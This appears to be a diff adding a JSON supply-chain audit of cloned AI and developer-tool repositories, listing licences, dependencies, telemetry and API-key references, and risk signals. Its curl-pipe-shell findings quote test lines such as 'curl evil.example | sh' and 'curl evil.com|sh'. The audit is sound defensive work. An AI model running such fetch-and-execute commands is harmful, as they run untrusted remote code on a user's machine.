+          "apps/sdk-playground/src/lib/api-keys.ts: OPENAI_API_KEY",
+          "packages/agent-framework-python/README.md: OPENAI_API_KEY",
+          "packages/agent-framework-python/test_real.py: OPENAI_API_KEY",
+          "packages/ai-sdk/README.md: OPENAI_API_KEY"
+        ],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [
+          "README.md: curl -fsSL https://supermemory.ai/install | bash",
+          "packages/openai-sdk-python/README.md: curl -LsSf https://astral.sh/uv/install.sh | sh"
+        ],
+        "postinstall_hook": [],
+        "sudo_in_docs": [],
+        "remote_code_load": []
+      },
+      "files": 914
+    },
+    {
+      "name": "mcp-python-sdk",
+      "category": "protocols",
+      "url": "https://github.com/modelcontextprotocol/python-sdk.git",
+      "priority": "CRITICAL",
+      "kind": "MCP Python SDK",
+      "status": "cloned",
+      "commit": "2118f14f8a19bc158d8a1cf90af58d85d187f849",
+      "commit_date": "2026-10-02T22:56:10+01:00",
+      "branch": "main",
+      "size_mb": 15.0,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "MIT",
+            "osd": true
+          }
+        ],
+        "spdx": "MIT",
+        "osd": true,
+        "dual": false
+      },
+      "language": "Python",
+      "language_mix": {
+        "Python": 349,
+        "Shell": 4,
+        "JavaScript": 4,
+        "HTML": 1
+      },
+      "dependencies": {
+        "python:pyproject.toml": [
+          "python-dotenv",
+          "rich",
+          "typer"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "CODE_OF_CONDUCT.md: anthropic.",
+          "pyproject.toml: anthropic.",
+          "examples/mcpserver/memory.py: openai.",
+          "src/mcp-types/pyproject.toml: anthropic."
+        ],
+        "telemetry_sdk": [
+          "docs/migration.md: Telemetry"
+        ],
+        "api_key_env": [
+          "i18n/README.md: ANTHROPIC_API_KEY",
+          ".github/workflows/claude.yml: anthropic_api_key",
+          "scripts/docs/translations.py: ANTHROPIC_API_KEY",
+          "tests/docs/test_translations.py: ANTHROPIC_API_KEY"
+        ],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [],
+        "postinstall_hook": [],
+        "sudo_in_docs": [],
+        "remote_code_load": []
+      },
+      "files": 1717
+    },
+    {
+      "name": "litellm",
+      "category": "routing",
+      "url": "https://github.com/BerriAI/litellm.git",
+      "priority": "HIGH",
+      "kind": "LLM abstraction + routing",
+      "status": "cloned",
+      "commit": "be4481779ee8a73579af82a3b5394f62f4e4b057",
+      "commit_date": "2026-10-04T17:34:30-07:00",
+      "branch": "main",
+      "size_mb": 209.1,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "MIT",
+            "osd": true
+          }
+        ],
+        "spdx": "MIT",
+        "osd": true,
+        "dual": false
+      },
+      "language": "Python",
+      "language_mix": {
+        "Python": 2991,
+        "TypeScript": 2378,
+        "Rust": 632,
+        "JavaScript": 173,
+        "Go": 104,
+        "HTML": 54
+      },
+      "dependencies": {
+        "python:pyproject.toml": [
+          "InquirerPy",
+          "PyJWT",
+          "RestrictedPython",
+          "a2a-sdk",
+          "aiohttp",
+          "anthropic",
+          "apscheduler",
+          "audioread",
+          "aurelio-sdk",
+          "aws-sdk-bedrock-runtime",
+          "azure-ai-contentsafety",
+          "azure-identity",
+          "azure-keyvault-secrets",
+          "azure-storage-blob",
+          "azure-storage-file-datalake",
+          "backoff",
+          "boto3",
+          "click",
+          "cryptography",
+          "ddtrace",
+          "detect-secrets",
+          "diskcache",
+          "expression",
+          "fastapi",
+          "fastapi-sso",
+          "fastuuid",
+          "filelock",
+          "google-cloud-aiplatform",
+          "google-cloud-iam",
+          "google-cloud-kms",
+          "google-cloud-speech",
+          "google-genai",
+          "granian",
+          "grpcio",
+          "gunicorn",
+          "hiredis",
+          "httpx",
+          "httpx2",
+          "huggingface-hub",
+          "importlib-metadata"
+        ],
+        "node:package.json": [
+          "prism-react-renderer",
+          "prisma",
+          "react-copy-to-clipboard"
+        ],
+        "manifest:rust:litellm-rust/Cargo.toml": [
+          "(no required deps)"
+        ],
+        "manifest:go:cookbook/gollem_go_agent_framework/go.mod": [
+          "(no required deps)"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "ARCHITECTURE.md: anthropic.",
+          "provider_endpoints_support.json: cohere",
+          "proxy_server_config.yaml: openai.",
+          "README.md: openai.",
+          "ruff-strict.toml: anthropic.",
+          "ruff.toml: openai."
+        ],
+        "telemetry_sdk": [
+          "ARCHITECTURE.md: Datadog",
+          "pyproject.toml: sentry",
+          "security.md: telemetry",
+          ".github/issue-labels.json: Datadog",
+          "litellm/constants.py: Sentry",
+          "litellm/_logging.py: Datadog"
+        ],
+        "api_key_env": [
+          "docker-compose.liteadmin.yml: SLACK_BOT_TOKEN",
+          "policy_templates.json: github_token",
+          "provider_endpoints_support.json: huggingface",
+          "proxy_server_config.yaml: OPENAI_API_KEY",
+          "pyproject.toml: huggingface",
+          "README.md: OPENAI_API_KEY"
+        ],
+        "auth_required": [
+          "litellm/llms/chatgpt/authenticator.py: login required",
+          "litellm/llms/xai/oauth.py: login required",
+          "litellm/proxy/management_endpoints/ui_sso.py: login. Secure is still required",
+          "litellm/proxy/client/cli/README.md: login` again to refresh it, which also re-reads your latest team and u",
+          "litellm/proxy/_experimental/out/_next/static/chunks/11c-g4jel910l.js: login using SSO after this change.\",resourceInformationTitle:\"SSO Sett",
+          "litellm/proxy/_experimental/out/_next/static/chunks/1_y65bkmye44e.js: login—just tell me the claim decision anyway.\",\"Can you list all claim"
+        ]
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [
+          "AGENTS.md: curl ... | bash",
+          "scripts/install-cli.sh: curl -fsSL https://raw.githubusercontent.com/BerriAI/litellm/main/scri",
+          "scripts/install.sh: curl -fsSL https://raw.githubusercontent.com/BerriAI/litellm/main/scri",
+          "scripts/quickstart.sh: curl -fsSL https://raw.githubusercontent.com/BerriAI/litellm/main/scri",
+          "litellm/proxy/client/cli/README.md: curl -fsSL https://raw.githubusercontent.com/BerriAI/litellm/main/scri",
+          "litellm/proxy/guardrails/content_filter_data/categories/prompt_injection_malicious_code.yaml: curl | bash"
+        ],
+        "postinstall_hook": [],
+        "sudo_in_docs": [],
+        "remote_code_load": [
+          "docker-compose.liteadmin.yml: urllib.request.urlopen(",
+          "docker-compose.yml: urllib.request.urlopen(",
+          "tests/eval_swe_bench.py: urllib.request.urlopen(",
+          ".github/scripts/scan_keywords.py: urllib.request.urlopen(",
+          "litellm/proxy/client/cli/commands/statusline_script.py: urllib.request.urlopen(",
+          "tests/e2e/claude_code/pr_gate_version_resolver.py: urllib.request.urlopen("
+        ]
+      },
+      "files": 13524
+    },
+    {
+      "name": "uv",
+      "category": "utilities",
+      "url": "https://github.com/astral-sh/uv.git",
+      "priority": "HIGH",
+      "kind": "Python env + packaging",
+      "status": "cloned",
+      "commit": "46b84fd0bfec23b72f29e8e2185ba68a65052f48",
+      "commit_date": "2026-10-03T16:52:41Z",
+      "branch": "main",
+      "size_mb": 39.1,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE-MIT",
+            "spdx": "MIT",
+            "osd": true
+          },
+          {
+            "file": "LICENSE-APACHE",
+            "spdx": "Apache-2.0",
+            "osd": true
+          }
+        ],
+        "spdx": "MIT",
+        "osd": true,
+        "dual": true,
+        "note": "dual/multi-file: LICENSE-MIT=MIT, LICENSE-APACHE=Apache-2.0"
+      },
+      "language": "Rust",
+      "language_mix": {
+        "Rust": 583,
+        "Python": 48,
+        "Shell": 24,
+        "PowerShell": 3,
+        "Batch": 3,
+        "Jupyter": 1
+      },
+      "dependencies": {
+        "manifest:python:pyproject.toml": [
+          "(no required deps)"
+        ],
+        "manifest:rust:Cargo.toml": [
+          "(no required deps)"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "test/ecosystem/airflow/pyproject.toml: cohere",
+          "test/ecosystem/openai-python/pyproject.toml: openai.",
+          "test/ecosystem/semantic-kernel/pyproject.toml: mistralai"
+        ],
+        "telemetry_sdk": [
+          "scripts/build_uv_pgo.py: sentry",
+          "crates/uv/tests/it/ecosystem.rs: sentry",
+          "test/ecosystem/airflow/pyproject.toml: sentry",
+          "test/ecosystem/github-wikidata-bot/pyproject.toml: sentry",
+          "test/ecosystem/home-assistant-core/pyproject.toml: DataDog",
+          "test/ecosystem/pyx-external/pyproject.toml: sentry"
+        ],
+        "api_key_env": [
+          ".github/workflows/check-release.yml: GITHUB_TOKEN",
+          ".github/workflows/diagnose-workflow-failure.yml: OPENAI_API_KEY",
+          ".github/workflows/fix-bug.yml: OPENAI_API_KEY",
+          ".github/workflows/issue-triage.yml: OPENAI_API_KEY",
+          ".github/workflows/publish-docker-image.yml: GITHUB_TOKEN",
+          ".github/workflows/pull-request-labels.yml: OPENAI_API_KEY"
+        ],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [
+          "README.md: curl -LsSf https://astral.sh/uv/install.sh | sh",
+          "docs/index.md: curl -LsSf https://astral.sh/uv/install.sh | sh",
+          ".github/workflows/test-system.yml: curl https://pyenv.run | bash",
+          "docs/getting-started/installation.md: curl -LsSf https://astral.sh/uv/install.sh | sh",
+          "docs/reference/installer.md: curl -LsSf https://astral.sh/uv/install.sh | sh"
+        ],
+        "postinstall_hook": [],
+        "sudo_in_docs": [
+          "CONTRIBUTING.md: sudo apt",
+          ".github/workflows/bench.yml: sudo apt",
+          ".github/workflows/build-dev-binaries.yml: sudo apt",
+          ".github/workflows/test-integration.yml: sudo apt",
+          ".github/workflows/test.yml: sudo apt",
+          "crates/uv-trampoline/README.md: sudo apt"
+        ],
+        "remote_code_load": [
+          "scripts/publish-crates.py: urllib.request.urlopen("
+        ]
+      },
+      "files": 1768
+    },
+    {
+      "name": "AutoGPT",
+      "category": "workflows",
+      "url": "https://github.com/Significant-Gravitas/AutoGPT.git",
+      "priority": "LOW/MEDIUM",
+      "kind": "autonomous agent (reference)",
+      "status": "cloned",
+      "commit": "f8b0e0a87c38b67f6e6cb21f3ee03ff5584c3588",
+      "commit_date": "2026-10-02T14:16:47Z",
+      "branch": "master",
+      "size_mb": 225.1,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "Polyform-Shield",
+            "osd": false
+          }
+        ],
+        "spdx": "Polyform-Shield",
+        "osd": false,
+        "dual": false
+      },
+      "language": "TypeScript",
+      "language_mix": {
+        "TypeScript": 3072,
+        "Python": 2367,
+        "Shell": 31,
+        "CSS": 10,
+        "JavaScript": 9,
+        "Batch": 2
+      },
+      "dependencies": {
+        "python:classic/pyproject.toml": [
+          "Pillow",
+          "aiohttp",
+          "anthropic",
+          "beautifulsoup4",
+          "boto3",
+          "charset-normalizer",
+          "click",
+          "colorama",
+          "ddgs",
+          "demjson3",
+          "distro",
+          "docker",
+          "en-core-web-sm",
+          "fastapi",
+          "gTTS",
+          "gitpython",
+          "google-api-python-client",
+          "google-cloud-logging",
+          "google-cloud-storage",
+          "groq",
+          "hypercorn",
+          "jinja2",
+          "jsonschema",
+          "numpy",
+          "openai",
+          "orjson",
+          "playsound",
+          "playwright",
+          "prompt-toolkit",
+          "pydantic",
+          "pylatexenc",
+          "pypdf",
+          "pytest",
+          "python-docx",
+          "python-dotenv",
+          "python-multipart",
+          "pyyaml",
+          "requests",
+          "rich",
+          "sentry-sdk"
+        ],
+        "node:autogpt_platform/frontend/package.json": [
+          "@ai-sdk/react",
+          "@faker-js/faker",
+          "@ferrucc-io/emoji-picker",
+          "@hookform/resolvers",
+          "@hugeicons/core-free-icons",
+          "@hugeicons/react",
+          "@phosphor-icons/react",
+          "@posthog/react",
+          "@radix-ui/react-accordion",
+          "@radix-ui/react-checkbox",
+          "@radix-ui/react-collapsible",
+          "@radix-ui/react-context-menu",
+          "@radix-ui/react-dialog",
+          "@radix-ui/react-dropdown-menu",
+          "@radix-ui/react-icons",
+          "@radix-ui/react-label",
+          "@radix-ui/react-popover",
+          "@radix-ui/react-radio-group",
+          "@radix-ui/react-scroll-area",
+          "@radix-ui/react-select",
+          "@radix-ui/react-separator",
+          "@radix-ui/react-slot",
+          "@radix-ui/react-switch",
+          "@radix-ui/react-tabs",
+          "@radix-ui/react-tooltip",
+          "@ricky0123/vad-web",
+          "@rjsf/core",
+          "@rjsf/utils",
+          "@rjsf/validator-ajv8",
+          "@sentry/nextjs",
+          "@streamdown/cjk",
+          "@streamdown/math",
+          "@streamdown/mermaid",
+          "@tanstack/react-query",
+          "@tanstack/react-table",
+          "@types/jaro-winkler",
+          "@vercel/analytics",
+          "@vercel/speed-insights",
+          "@xyflow/react",
+          "ai"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "autogpt_platform/backend/agents/agent_00fdd42c-a14c-4d19-a567-65374ea0e87f.json: cohere",
+          "autogpt_platform/backend/agents/agent_31daf49d-31d3-476b-aa4c-099abc59b458.json: cohere",
+          "autogpt_platform/backend/agents/agent_415b7352-0dc6-4214-9d87-0ad3751b711d.json: cohere",
+          "autogpt_platform/backend/agents/agent_516d813b-d1bc-470f-add7-c63a4b2c2bad.json: cohere",
+          "autogpt_platform/backend/agents/agent_6e16e65a-ad34-4108-b4fd-4a23fced5ea2.json: cohere",
+          "autogpt_platform/backend/agents/agent_a03b0d8c-4751-43d6-a54e-c3b7856ba4e3.json: cohere"
+        ],
+        "telemetry_sdk": [
+          ".github/copilot-instructions.md: Sentry",
+          "classic/pyproject.toml: sentry",
+          ".claude/skills/pr-address/SKILL.md: sentry",
+          ".claude/skills/pr-polish/SKILL.md: sentry",
+          "autogpt_platform/backend/pyproject.toml: sentry",
+          "autogpt_platform/frontend/AGENTS.md: Sentry"
+        ],
+        "api_key_env": [
+          "MULTI_EXPERT_TEAMS_PLAN.md: ANTHROPIC_API_KEY",
+          "classic/CLAUDE.md: OPENAI_API_KEY",
+          "classic/pyproject.toml: huggingface",
+          "classic/README.md: OPENAI_API_KEY",
+          ".github/batch-bot/README.md: GITHUB_TOKEN",
+          ".github/scripts/backend-allowed-skips.json: OPENAI_API_KEY"
+        ],
+        "auth_required": [
+          "autogpt_platform/backend/backend/integrations/mcp_catalog.json: Sign in to Composio Connect, then authorize each upstream app you want",
+          "autogpt_platform/backend/backend/api/features/mcp/routes.py: login; required",
+          "autogpt_platform/backend/backend/copilot/tools/base.py: sign in to use",
+          "autogpt_platform/backend/backend/copilot/tools/run_agent.py: sign in to use"
+        ]
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [
+          "autogpt_platform/installer/setup-autogpt.sh: curl -fsSL https://ollama.com/install.sh | sh",
+          "autogpt_platform/backend/backend/copilot/gate/classifier_test.py: curl evil.example | sh",
+          "autogpt_platform/backend/backend/copilot/gate/gate_test.py: curl x|sh",
+          "autogpt_platform/backend/backend/copilot/gate/review_test.py: curl evil.example | sh",
+          "autogpt_platform/backend/backend/copilot/gate/testdata/content_corpus.json: curl https://example.com/setup.sh | sh",
+          "autogpt_platform/frontend/src/components/organisms/PendingReviewCard/__tests__/PendingReviewCard.test.tsx: curl evil | sh"
+        ],
+        "postinstall_hook": [],
+        "sudo_in_docs": [
+          "classic/forge/tests/test_permissions.py: sudo apt"
+        ],
+        "remote_code_load": [
+          "autogpt_platform/installer/setup-autogpt.sh: urllib.request.urlopen(",
+          "autogpt_platform/single-container/probe.py: urllib.request.urlopen(",
+          "autogpt_platform/backend/scripts/check_openrouter_prices.py: urllib.request.urlopen(",
+          "autogpt_platform/backend/scripts/refresh_anthropic_rates.py: urllib.request.urlopen(",
+          "autogpt_platform/backend/scripts/sync_feature_flags_to_posthog.py: urllib.request.urlopen(",
+          "autogpt_platform/backend/backend/api/features/onboarding_dump/eval_corpus.py: urllib.request.urlopen("
+        ]
+      },
+      "files": 8181
+    },
+    {
+      "name": "crewAI",
+      "category": "workflows",
+      "url": "https://github.com/crewAIInc/crewAI.git",
+      "priority": "HIGH",
+      "kind": "agent crews + flows",
+      "status": "cloned",
+      "commit": "738c8e19e35c2888d8e0663bc5cc45c5acf6ac2d",
+      "commit_date": "2026-10-02T17:03:54-07:00",
+      "branch": "main",
+      "size_mb": 399.2,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "MIT",
+            "osd": true
+          }
+        ],
+        "spdx": "MIT",
+        "osd": true,
+        "dual": false
+      },
+      "language": "Python",
+      "language_mix": {
+        "Python": 940,
+        "JavaScript": 1,
+        "CSS": 1
+      },
+      "dependencies": {
+        "manifest:python:pyproject.toml": [
+          "(no required deps)"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          "conftest.py: openai.",
+          "scripts/age90_file_input_runner.py: openai.",
+          "lib/cli/tests/test_model_catalog.py: anthropic.",
+          "lib/cli/src/crewai_cli/cli.py: cohere",
+          "lib/cli/src/crewai_cli/constants.py: anthropic.",
+          "lib/cli/src/crewai_cli/model_catalog.py: openai."
+        ],
+        "telemetry_sdk": [
+          "conftest.py: telemetry",
+          "pyproject.toml: telemetry",
+          "README.md: Telemetry",
+          "scripts/wharf_runner.py: telemetry",
+          "lib/crewai/pyproject.toml: Telemetry",
+          "lib/crewai/README.md: Telemetry"
+        ],
+        "api_key_env": [
+          "pyproject.toml: huggingface",
+          "scripts/age90_file_input_runner.py: OPENAI_API_KEY",
+          "scripts/wharf_runner.py: OPENAI_API_KEY",
+          ".github/workflows/ftc-require-issue.yml: GITHUB_TOKEN",
+          ".github/workflows/pr-size.yml: GITHUB_TOKEN",
+          ".github/workflows/pr-title.yml: GITHUB_TOKEN"
+        ],
+        "auth_required": []
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [
+          "README.md: curl -LsSf https://astral.sh/uv/install.sh | sh",
+          "lib/crewai/README.md: curl -LsSf https://astral.sh/uv/install.sh | sh"
+        ],
+        "postinstall_hook": [],
+        "sudo_in_docs": [],
+        "remote_code_load": [
+          "lib/crewai-tools/src/crewai_tools/tools/arxiv_paper_tool/arxiv_paper_tool.py: urllib.request.urlopen("
+        ]
+      },
+      "files": 31868
+    },
+    {
+      "name": "prefect",
+      "category": "workflows",
+      "url": "https://github.com/PrefectHQ/prefect.git",
+      "priority": "HIGH",
+      "kind": "reliable workflow orchestration",
+      "status": "cloned",
+      "commit": "2338265f658845a9bef8ce7baf07519b89846dc8",
+      "commit_date": "2026-10-02T17:54:53-05:00",
+      "branch": "main",
+      "size_mb": 85.8,
+      "error": "",
+      "licence": {
+        "files": [
+          {
+            "file": "LICENSE",
+            "spdx": "Apache-2.0",
+            "osd": true
+          }
+        ],
+        "spdx": "Apache-2.0",
+        "osd": true,
+        "dual": false
+      },
+      "language": "TypeScript",
+      "language_mix": {
+        "TypeScript": 1657,
+        "Python": 1132,
+        "Shell": 6,
+        "JavaScript": 5,
+        "HTML": 2,
+        "CSS": 2
+      },
+      "dependencies": {
+        "python:pyproject.toml": [
+          "aiosqlite",
+          "alembic",
+          "amplitude-analytics",
+          "anyio",
+          "apprise",
+          "asgi-lifespan",
+          "asyncpg",
+          "cachetools",
+          "click",
+          "cloudpickle",
+          "coolname",
+          "cryptography",
+          "cyclopts",
+          "dateparser",
+          "docker",
+          "exceptiongroup",
+          "fastapi",
+          "fsspec",
+          "graphviz",
+          "griffe",
+          "httpcore",
+          "httpx",
+          "humanize",
+          "jinja2",
+          "jinja2-humanize-extension",
+          "jsonpatch",
+          "jsonschema",
+          "opentelemetry-api",
+          "opentelemetry-distro",
+          "opentelemetry-exporter-otlp",
+          "opentelemetry-instrumentation",
+          "opentelemetry-instrumentation-logging",
+          "opentelemetry-instrumentation-system-metrics",
+          "opentelemetry-test-utils",
+          "orjson",
+          "packaging",
+          "pathspec",
+          "pendulum",
+          "pluggy",
+          "prefect-aws"
+        ],
+        "node:ui/package.json": [
+          "@prefecthq/prefect-design",
+          "@prefecthq/prefect-ui-library",
+          "@prefecthq/vue-charts",
+          "@prefecthq/vue-compositions",
+          "@types/lodash.debounce",
+          "axios",
+          "lodash.debounce",
+          "lodash.merge",
+          "tailwindcss",
+          "vee-validate",
+          "vue",
+          "vue-router"
+        ]
+      },
+      "privacy_signals": {
+        "cloud_api_calls": [
+          ".github/workflows/claude.yml: anthropic."
+        ],
+        "telemetry_sdk": [
+          "pyproject.toml: amplitude",
+          "pyrightconfig-ci.json: telemetry",
+          "client/pyproject.toml: amplitude",
+          "docs/docs.json: telemetry",
+          "docs/script.js: amplitude",
+          "load_testing/README.md: telemetry"
+        ],
+        "api_key_env": [
+          "examples/ai_database_cleanup_with_approval.py: ANTHROPIC_API_KEY",
+          "examples/ai_data_analyst_with_pydantic_ai.py: OPENAI_API_KEY",
+          ".github/workflows/agents-md-update.yml: GITHUB_TOKEN",
+          ".github/workflows/copy-linked-issue-labels.yml: GITHUB_TOKEN",
+          ".github/workflows/docker-images.yaml: GITHUB_TOKEN",
+          ".github/workflows/docs-update.yml: GITHUB_TOKEN"
+        ],
+        "auth_required": [
+          "src/integrations/prefect-email/prefect_email/credentials.py: login is not required",
+          "ui-v2/src/mocks/create-fake-block-schema.ts: login is not required",
+          "ui-v2/src/routes/__root.tsx: login if auth is required"
+        ]
+      },
+      "risk_signals": {
+        "curl_pipe_shell": [
+          "tests/runner/test_storage.py: curl evil.com|sh"
+        ],
+        "postinstall_hook": [],
+        "sudo_in_docs": [
+          ".github/workflows/benchmarks.yaml: sudo apt"
+        ],
+        "remote_code_load": [
+          "examples/run_dbt_with_prefect.py: urllib.request.urlopen(",
+          "src/integrations/prefect-aws/infra/worker/service_stack.py: urllib.request.urlopen(",
+          "src/integrations/prefect-aws/prefect_aws/templates/ecs/service.json: urllib.request.urlopen("
+        ]
+      },
+      "files": 5438
+    }
+  ]
+}
